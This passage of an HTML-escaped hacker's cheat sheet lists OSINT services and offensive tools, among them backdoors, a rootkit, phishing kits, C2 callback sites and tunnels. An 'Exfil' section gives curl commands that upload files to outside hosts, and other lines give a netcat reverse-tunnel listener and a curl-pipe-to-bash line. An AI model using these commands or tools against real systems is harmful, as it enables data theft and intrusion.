&lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://cli.fyi&#34;&gt;https://cli.fyi&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Free. curl/json interface to many services. Try &lt;code&gt;curl cli.fyi/me&lt;/code&gt; or &lt;code&gt;curl cli.fyi/thc.org&lt;/code&gt;.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://hackertarget.com/ip-tools/&#34;&gt;https://hackertarget.com/ip-tools/&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Free OSINT Service (Reverse IP, MTR, port scan, CMS scans, Vulnerability Scans, API support)&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://account.shodan.io/billing/tour&#34;&gt;https://account.shodan.io/billing/tour&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Open Port DB &amp;amp; DNS Lookup from around the world&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://dnsdumpster.com/&#34;&gt;https://dnsdumpster.com/&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Domain Recon Tool&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://crt.sh/&#34;&gt;https://crt.sh/&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;TLS Certificate Search&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://archive.org/web/&#34;&gt;https://archive.org/web/&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Historical view of websites&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://www.farsightsecurity.com/solutions/dnsdb/&#34;&gt;https://www.farsightsecurity.com/solutions/dnsdb/&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;DNS search (not free)&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://wigle.net/&#34;&gt;https://wigle.net/&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Wireless Network Mapper&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://radiocells.org/&#34;&gt;https://radiocells.org/&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Cell Tower Informations&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://www.shodan.io/&#34;&gt;https://www.shodan.io/&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Search Engine to find devices &amp;amp; Banners (not free)&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://spur.us/context/me&#34;&gt;https://spur.us/context/me&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;IP rating &lt;code&gt;https://spur.us/context/&amp;lt;IP&amp;gt;&lt;/code&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;http://drs.whoisxmlapi.com&#34;&gt;http://drs.whoisxmlapi.com&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Reverse Whois Lookup (not free)&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://www.abuseipdb.com&#34;&gt;https://www.abuseipdb.com&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;IP abuse rating&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;OSINT for Detectives&lt;/th&gt; &#xA;   &lt;th&gt;&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://start.me/p/rx6Qj8/nixintel-s-osint-resource-list&#34;&gt;https://start.me/p/rx6Qj8/nixintel-s-osint-resource-list&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Nixintel&#39;s OSINT Resource List&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/jivoi/awesome-osint&#34;&gt;https://github.com/jivoi/awesome-osint&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Awesome OSINT list&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://cipher387.github.io/osint_stuff_tool_collection/&#34;&gt;https://cipher387.github.io/osint_stuff_tool_collection/&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;OSINT tools collection&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://osintframework.com/&#34;&gt;https://osintframework.com/&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Many OSINT tools&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;OSINT Databases&lt;/th&gt; &#xA;   &lt;th&gt;&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://data.ddosecrets.com/&#34;&gt;https://data.ddosecrets.com/&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Database Dumps&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;&lt;a id=&#34;misc&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;12. Miscellaneous&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a id=&#34;tools&#34;&gt;&lt;/a&gt; &lt;strong&gt;12.i. Tools of the trade&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Comms&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.cs.email/&#34;&gt;CryptoStorm Email&lt;/a&gt; - Disposable emails (send &amp;amp; receive). (List of &lt;a href=&#34;https://github.com/AnarchoTechNYC/meta/wiki/Disposable-email-services%5D&#34;&gt;Disposable-email-services&lt;/a&gt;).&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://temp-mail.org/en/&#34;&gt;Temp-Mail&lt;/a&gt; - Disposable email service with great Web GUI. Receive only.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://quackr.io/&#34;&gt;Quackr.Io&lt;/a&gt; - Disposable SMS/text messages (List of &lt;a href=&#34;https://github.com/AnarchoTechNYC/meta/wiki/Disposable-SMS-services&#34;&gt;Disposable-SMS-services&lt;/a&gt;).&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://crypton.sh/&#34;&gt;Crypton&lt;/a&gt; - Rent a private SIM/SMS with crypto (&lt;a href=&#34;http://cryptonx6nsmspsnpicuihgmbbz3qvro4na35od3eht4vojdo7glm6yd.onion/&#34;&gt;.onion&lt;/a&gt;)&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;OpSec&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@hackerschoice/it-security-and-privacy-for-the-rebellions-of-the-world-db4023cadcca&#34;&gt;OpSec for Rebellions&lt;/a&gt; - Start Here. The simplest 3 steps.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://riseup.net/&#34;&gt;RiseUp&lt;/a&gt; - Mail, VPN and Tips for (online) rebellions.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/m1k1o/neko&#34;&gt;Neko&lt;/a&gt; - Launch Firefox in Docker and access via 127.0.0.1:8080 (WebRTC)&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/mviereck/x11docker&#34;&gt;x11Docker&lt;/a&gt; - Isolate any X11 app in a container (Linux &amp;amp; Windows only). (&lt;a href=&#34;https://techviewleo.com/run-gui-applications-in-docker-using-x11docker/?expand_article=1&#34;&gt;Article&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/freedomofpress/dangerzone&#34;&gt;DangerZone&lt;/a&gt; - Make PDFs safe before opening them.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://exiftool.org/&#34;&gt;ExifTool&lt;/a&gt; - Remove meta data from files (&lt;code&gt;exiftool -all= example.pdf example1.jpg ...&lt;/code&gt;)&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.eff.org/&#34;&gt;EFF&lt;/a&gt; - Clever advise for freedom figthers.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;Exploits&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/liamg/traitor&#34;&gt;Traitor&lt;/a&gt; - Tries various exploits/vulnerabilities to gain root (LPE)&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://packetstormsecurity.com&#34;&gt;PacketStorm&lt;/a&gt; - Our favorite site ever since we shared a Pizza with fringe[at]dtmf.org in NYC in 2000&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.exploit-db.com&#34;&gt;ExploitDB&lt;/a&gt; - Also includes metasploit db and google hacking db&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://exploits.shodan.io/welcome&#34;&gt;Shodan/Exploits&lt;/a&gt; - Similar to exploit-db&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;System Information Gathering&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS&#34;&gt;https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS&lt;/a&gt; - Quick system informations for hackers.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/zMarch/Orc&#34;&gt;https://github.com/zMarch/Orc&lt;/a&gt; - Post-exploit tool to find local RCE (type &lt;code&gt;getexploit&lt;/code&gt; after install)&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;Backdoors&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.gsocket.io/deploy&#34;&gt;https://www.gsocket.io/deploy&lt;/a&gt; - The world&#39;s smallest backdoor&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/m0nad/Diamorphine&#34;&gt;https://github.com/m0nad/Diamorphine&lt;/a&gt; - Linux Kernel Module for hiding processes and files&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.kali.org/tools/weevely&#34;&gt;https://www.kali.org/tools/weevely&lt;/a&gt; - PHP backdoor&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;Network Scanners&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/robertdavidgraham/masscan&#34;&gt;https://github.com/robertdavidgraham/masscan&lt;/a&gt; - Scan the entire Internet&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ptrrkssn/pnscan&#34;&gt;https://github.com/ptrrkssn/pnscan&lt;/a&gt; - Fast network scanner&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://zmap.io/&#34;&gt;https://zmap.io/&lt;/a&gt; - ZMap &amp;amp; ZGrab&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;Vulnerability Scanners&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/evyatarmeged/Raccoon&#34;&gt;Raccoon&lt;/a&gt; - Reconnaissance and Information Gathering&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/j3ssie/osmedeus&#34;&gt;Osmedeus&lt;/a&gt; - Vulnerability and Information gathering&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/fullhunt/&#34;&gt;FullHunt&lt;/a&gt; - log4j and spring4shell scanner&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;DDoS&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/the-deepnet/ddos&#34;&gt;DeepNet&lt;/a&gt; - we despise DDoS but if we had to then this would be our choice.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;Static Binaries / Warez&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64&#34;&gt;https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://iq.thc.org/cross-compiling-exploits&#34;&gt;https://iq.thc.org/cross-compiling-exploits&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;Phishing&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/htr-tech/zphisher&#34;&gt;https://github.com/htr-tech/zphisher&lt;/a&gt; - We don&#39;t hack like this but this is what we would use.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://da.gd/&#34;&gt;https://da.gd/&lt;/a&gt; - Tinier TinyUrl and allows &lt;a href=&#34;https://www.google.com-fish-fish@da.gd/blah&#34;&gt;https://www.google.com-fish-fish@da.gd/blah&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;Tools&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/guitmz/ezuri&#34;&gt;https://github.com/guitmz/ezuri&lt;/a&gt; - Obfuscate Linux binaries&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://tmate.io/&#34;&gt;https://tmate.io/&lt;/a&gt; - Share A screen with others&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;Callback / Canary / Command &amp;amp; Control&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://dnslog.cn&#34;&gt;http://dnslog.cn&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://app.interactsh.com&#34;&gt;https://app.interactsh.com&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://api.telegram.org&#34;&gt;https://api.telegram.org&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://webhook.site&#34;&gt;https://webhook.site&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;Tunneling&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ginuerzh/gost/raw/master/README_en.md&#34;&gt;Gost&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://tgcd.sourceforge.net/&#34;&gt;TCP Gender Changer&lt;/a&gt; for all your &#39;connect back&#39; needs.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://ngrok.com/download&#34;&gt;ngrok&lt;/a&gt;, &lt;a href=&#34;https://developers.cloudflare.com/cloudflare-one/connections/connect-apps&#34;&gt;cloudflared&lt;/a&gt; or &lt;a href=&#34;https://pagekite.net/&#34;&gt;pagekite&lt;/a&gt; to make a server behind NAT accessible from the public Internet.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;Exfil&lt;a id=&#34;cloudexfil&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/hackerschoice/gsocket#blitz&#34;&gt;Blitz&lt;/a&gt; - &lt;code&gt;blitz -l&lt;/code&gt; / &lt;code&gt;blitz foo.txt&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://mega.io/cmd&#34;&gt;Mega&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://oshi.at/&#34;&gt;oshiAt&lt;/a&gt; - also on TOR. &lt;code&gt;curl -T foo.txt https://oshi.at&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://transfer.sh/&#34;&gt;Transfer.sh&lt;/a&gt; - &lt;code&gt;curl -T foo.txt https://transfer.sh&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://litterbox.catbox.moe/tools.php&#34;&gt;LitterBox&lt;/a&gt; - &lt;code&gt;curl -F reqtype=fileupload -F time=72h -F &#39;fileToUpload=@foo.txt&#39; https://litterbox.catbox.moe/resources/internals/api.php&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/schollz/croc&#34;&gt;Croc&lt;/a&gt; - &lt;code&gt;croc send foo.txt / croc anit-price-example&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://pypi.org/project/magic-wormhole/&#34;&gt;MagicWormhole&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;Publishing&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://valdikss.org.ru/schare/&#34;&gt;free BT/DC/eD2k seedbox&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Or use /onion on &lt;a href=&#34;https://www.thc.org/segfault&#34;&gt;segfault.net&lt;/a&gt; or plain old https with ngrok.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.duckdns.org/&#34;&gt;DuckDNS&lt;/a&gt; - Free Dynamic Domain Names&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.afraid.org&#34;&gt;afraid.org&lt;/a&gt; - Free Dynamic DNS for your domain&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://dns.he.net/&#34;&gt;he.net&lt;/a&gt; - Free Nameserver service&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://0bin.net/&#34;&gt;0bin&lt;/a&gt; / &lt;a href=&#34;https://paste.ec&#34;&gt;paste.ec&lt;/a&gt; - Encrypted PasteBin&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;Forums and Conferences&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://0x00sec.org/&#34;&gt;0x00Sec&lt;/a&gt; - Reverse Engineering &amp;amp; Hacking with a pinch of Malware&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.alligatorcon.eu/&#34;&gt;AlligatorCon&lt;/a&gt; - the original&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://0x41con.org/&#34;&gt;0x41con&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://tumpicon.org/&#34;&gt;TumpiCon&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;Telegram Channels&lt;a id=&#34;channels&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://t.me/thcorg&#34;&gt;The Hacker&#39;s Choice&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://t.me/thehackernews&#34;&gt;The Hacker News&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://t.me/CyberSecurityTechnologies&#34;&gt;CyberSecurity Technologies&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://t.me/OffensiveTwitter&#34;&gt;Offensive Twitter&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://t.me/Pwn3rzs&#34;&gt;Pwn3rzs&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://t.me/vxunderground&#34;&gt;VX-Underground&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://t.me/cKure&#34;&gt;cKure&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://t.me/androidMalware&#34;&gt;Android Security / Malware&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://t.me/cybdetective&#34;&gt;OSINT CyberDetective&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://t.me/bookzillaaa&#34;&gt;BookZillaaa&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;Mindmaps &amp;amp; Knowledge&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg&#34;&gt;Active Directory&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://singlelogin.me&#34;&gt;Z Library&lt;/a&gt;/&lt;a href=&#34;http://bookszlibb74ugqojhzhg2a63w5i2atv5bqarulgczawnbmsb6s6qead.onion/&#34;&gt;Z Library on TOR&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;&lt;a id=&#34;cool-linux-commands&#34;&gt;&lt;/a&gt; &lt;strong&gt;12.ii. Cool Linux commands&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://jvns.ca/blog/2022/04/12/a-list-of-new-ish--command-line-tools/&#34;&gt;https://jvns.ca/blog/2022/04/12/a-list-of-new-ish--command-line-tools/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ibraheemdev/modern-unix&#34;&gt;https://github.com/ibraheemdev/modern-unix&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;&lt;a id=&#34;tmux&#34;&gt;&lt;/a&gt; &lt;strong&gt;12.iii. tmux&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;&lt;/th&gt; &#xA;   &lt;th&gt;Tmux Cheat Sheet&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Save Scrollback&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;Ctrl+b&lt;/code&gt; + &lt;code&gt;:&lt;/code&gt;, then type &lt;code&gt;capture-pane -S -&lt;/code&gt; followed by &lt;code&gt;Ctrl+b&lt;/code&gt; + &lt;code&gt;:&lt;/code&gt; and type &lt;code&gt;save-buffer filename.txt&lt;/code&gt;.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Attach&lt;/td&gt; &#xA;   &lt;td&gt;Start a new tmux, then type &lt;code&gt;Ctrl+b&lt;/code&gt; + &lt;code&gt;s&lt;/code&gt; and use &lt;code&gt;LEFT&lt;/code&gt;, &lt;code&gt;RIGHT&lt;/code&gt; to expand and select any session.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Logging&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;Ctrl+b&lt;/code&gt; + &lt;code&gt;Shift + P&lt;/code&gt; to start and stop.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Menu&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;Ctrl+b&lt;/code&gt; + &lt;code&gt;&amp;gt;&lt;/code&gt;. Then use &lt;code&gt;Ctrl+b&lt;/code&gt; + &lt;code&gt;UP&lt;/code&gt;, &lt;code&gt;DOWN&lt;/code&gt;, &lt;code&gt;LEFT&lt;/code&gt; or &lt;code&gt;RIGHT&lt;/code&gt; to move between the panes.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;p&gt;&lt;a id=&#34;useful-commands&#34;&gt;&lt;/a&gt; &lt;strong&gt;12.iv. Useful commands&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Use &lt;code&gt;lsof -Pni&lt;/code&gt; or &lt;code&gt;netstat -putan&lt;/code&gt; (or &lt;code&gt;ss -putan&lt;/code&gt;) to list all Internet (&lt;em&gt;-tu&lt;/em&gt;) connections.&lt;/p&gt; &#xA;&lt;p&gt;Use &lt;code&gt;ss -lntp&lt;/code&gt; to show all listening (&lt;em&gt;-l&lt;/em&gt;) TCP (&lt;em&gt;-t&lt;/em&gt;) sockets.&lt;/p&gt; &#xA;&lt;p&gt;Use &lt;code&gt;netstat -rn&lt;/code&gt; or &lt;code&gt;ip route show&lt;/code&gt; to show default Internet route.&lt;/p&gt; &#xA;&lt;p&gt;Use &lt;code&gt;curl cheat.sh/tar&lt;/code&gt; to get TLDR help for tar. Works with any other linux command.&lt;/p&gt; &#xA;&lt;p&gt;Use &lt;code&gt;curl -fsSL bench.sh | bash&lt;/code&gt; to speed test a server.&lt;/p&gt; &#xA;&lt;p&gt;Hacking over long latency links or slow links can be frustrating. Every keystroke is transmitted one by one and any typo becomes so much more frustrating and time consuming to undo. &lt;em&gt;rlwrap&lt;/em&gt; comes to the rescue. It buffers all single keystrokes until &lt;em&gt;Enter&lt;/em&gt; is hit and then transmits the entire line at once. This makes it so much easier to type at high speed, correct typos, ...&lt;/p&gt; &#xA;&lt;p&gt;Example for the receiving end of a revese tunnel:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;rlwrap --always-readline nc -vnlp 1524&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Example for &lt;em&gt;SSH&lt;/em&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;rlwrap --always-readline ssh user@host&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;&lt;a id=&#34;others&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;13. Other Sites&lt;/h2&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://gist.github.com/jaredsburrows/9e121d2e5f1147ab12a696cf548b90b0&#34;&gt;Hacking HackingTeam - a HackBack&lt;/a&gt; - Old but real talent at work.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=5vRIisM0Op4&#34;&gt;Guacamaya Hackback&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.vx-underground.org/&#34;&gt;Vx Underground&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://0xdf.gitlab.io/2023/05/27/htb-absolute.html&#34;&gt;HTB absolute&lt;/a&gt; - Well written and explained attack.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ForbiddenProgrammer/conti-pentester-guide-leak&#34;&gt;Conti Leak&lt;/a&gt; - Windows hacking. Pragmatic.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.ired.team/&#34;&gt;Red Team Notes&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://book.hacktricks.xyz/welcome/readme&#34;&gt;HackTricks&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/yeyintminthuhtut/Awesome-Red-Teaming&#34;&gt;Awesome Red Teaming&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/vulhub/vulhub&#34;&gt;VulHub&lt;/a&gt; - Test your exploits&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.qubes-os.org/&#34;&gt;Qubes-OS&lt;/a&gt; - Desktop OS focused on security with XEN isolated (disposable) guest VMs (Fedora, Debian, Whonix out of the box)&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;Shoutz: ADM, 